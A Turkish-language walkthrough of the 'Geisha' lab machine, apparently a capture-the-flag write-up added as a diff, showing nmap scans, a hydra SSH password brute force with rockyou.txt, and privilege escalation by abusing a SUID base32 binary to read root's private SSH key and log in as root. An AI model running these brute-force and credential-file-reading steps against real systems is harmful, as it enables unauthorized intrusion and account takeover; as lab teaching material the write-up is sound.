@@ -1,0 +1,143 @@
+      ####Enumeration
+
+Nmap
+Bir tarama çalıştırarak başlıyoruz :
+kali@kali:~$ sudo nmap -p- $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 11:33 EDT
+Nmap scan report for $targetip
+Host is up (0.030s latency).
+Not shown: 65527 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+7080/tcp open  empowerid
+7125/tcp open  unknown
+8088/tcp open  radan-http
+9198/tcp open  unknown
+Ardından, nmap ile ortaya çıkan TCP bağlantı noktalarına karşı agresif bir tarama yapın:
+kali@kali:~$ nmap -p 21,22,80,3389,7080,7125,8088,9198 -A $targetip
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 11:39 EDT
+Nmap scan report for $targetip
+Host is up (0.032s latency).
+
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 3.0.3
+22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 1b:f2:5d:cd:89:13:f2:49:00:9f:8c:f9:eb:a2:a2:0c (RSA)
+|   256 31:5a:65:2e:ab:0f:59:ab:e0:33:3a:0c:fc:49:e0:5f (ECDSA)
+|_  256 c6:a7:35:14:96:13:f8:de:1e:e2:bc:e7:c7:66:8b:ac (ED25519)
+80/tcp   open  http     Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Geisha
+3389/tcp open  http     nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Seppuku
+7080/tcp open  ssl/http LiteSpeed httpd
+|_http-server-header: LiteSpeed
+|_http-title: Geisha
+| ssl-cert: Subject: commonName=geisha/organizationName=webadmin/countryName=US
+| Not valid before: 2020-05-09T14:01:34
+|_Not valid after:  2022-05-09T14:01:34
+|_ssl-date: 2020-08-20T15:40:33+00:00; 0s from scanner time.
+| tls-alpn: 
+|   h2
+|   spdy/3
+|   spdy/2
+|_  http/1.1
+7125/tcp open  http     nginx 1.17.10
+|_http-server-header: nginx/1.17.10
+|_http-title: Geisha
+8088/tcp open  http     LiteSpeed httpd
+|_http-server-header: LiteSpeed
+|_http-title: Geisha
+9198/tcp open  http     SimpleHTTPServer 0.6 (Python 2.7.16)
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.16
+|_http-title: Geisha
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 2.6.18 - 2.6.22 (94%), Linux 2.6.18 (91%), Linux 2.6.32 (90%), Linux 2.6.32 or 3.10 (90%), Linux 3.5 (90%), Linux 4.2 (90%), Linux 4.4 (90%), 
+Synology DiskStation Manager 5.1 (90%), WatchGuard Fireware 11.8 (90%), Linux 4.8 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT      ADDRESS
+1   30.94 ms $trace1
+2   31.13 ms $trace2
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 117.54 seconds
+
+      ####Exploitation
+
+      ####SSH Bruteforce
+Agresif taramada Geisha kelimesini birkaç kez gözlemledik . nmap bazı tahmin çalışmaları uygulayarak, geisha kullanıcı adı için SSH girişini kaba kuvvetle yapabiliriz. Bu işlem ortalama 5 dakika sürer:
+kali@kali:~$ hydra -l geisha -P /usr/share/wordlists/rockyou.txt $targetip ssh
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-20 11:23:43
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://$targetip:22/
+[STATUS] 163.00 tries/min, 163 tries in 00:01h, 14344240 to do in 1466:42h, 16 active
+[STATUS] 113.33 tries/min, 340 tries in 00:03h, 14344063 to do in 2109:26h, 16 active
+[22][ssh] host: $targetip   login: geisha   password: $passwordcensored
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 6 final worker threads did not complete until end.
+[ERROR] 6 targets did not resolve or could not be connected
+[ERROR] 0 targets did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-20 11:28:29
+Parolanın letmeinişe yaradığını ve kimlik doğrulaması yapabildiğimizi görüyoruz.
+
+      ####suid
+SUID izinlerine sahip ikili dosyaları numaralandırırken, /usr/bin/base32 :
+geisha@geisha:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/umount
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/base32
+/usr/bin/sudo
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/mount
+geisha@geisha:~$
+Bu ikili dosyanın yardım menüsünü görüntülerken aşağıdakileri görüyoruz:
+geisha@geisha:~$ base32 --help
+Usage: base32 [OPTION]... [FILE]
+Base32 encode or decode FILE, or standard input, to standard output.
+Bu ikili SUID izinlerine sahip olduğundan, kullanıcı olarak bir dosyayı kodlamak ve/veya kodunu çözmek için root kullanabiliriz . Kontrol edilecek dosyalardan biri /root/.ssh/id_rsa çünkü özel SSH anahtar içeriğini kurtarabilirsek root alabiliriz.
+Bunu yapmak için, önce o dosyanın içeriğini kodlamak için ikili dosyayı kullanacağız ve ardından kodlanmış dosyayı aynı ikili dosyaya aktararak kodunu çözeceğiz ve görüntüleyeceğiz:
+geisha@geisha:~$ base32 "/root/.ssh/id_rsa" | base32 --decode
+-----BEGIN RSA PRIVATE KEY-----
+$censoredsshprivatekey
+-----END RSA PRIVATE KEY-----
+
+geisha@geisha:~$
+Bu dosyayı kullanarak root localhost'ta olduğu gibi SSH yapabiliriz:
+geisha@geisha:~$ base32 "/root/.ssh/id_rsa" | base32 --decode > id_rsa
+geisha@geisha:~$ chmod 600 id_rsa 
+geisha@geisha:~$ ssh -i id_rsa root@localhost
+The authenticity of host 'localhost (::1)' can't be established.
+ECDSA key fingerprint is SHA256:VZJ2vD6+/BC5zd9v8nRSgqEHyfR17GuCELg0nE0BkFk.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
+Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Aug 20 11:14:48 2020
+root@geisha:~# whoami
+root
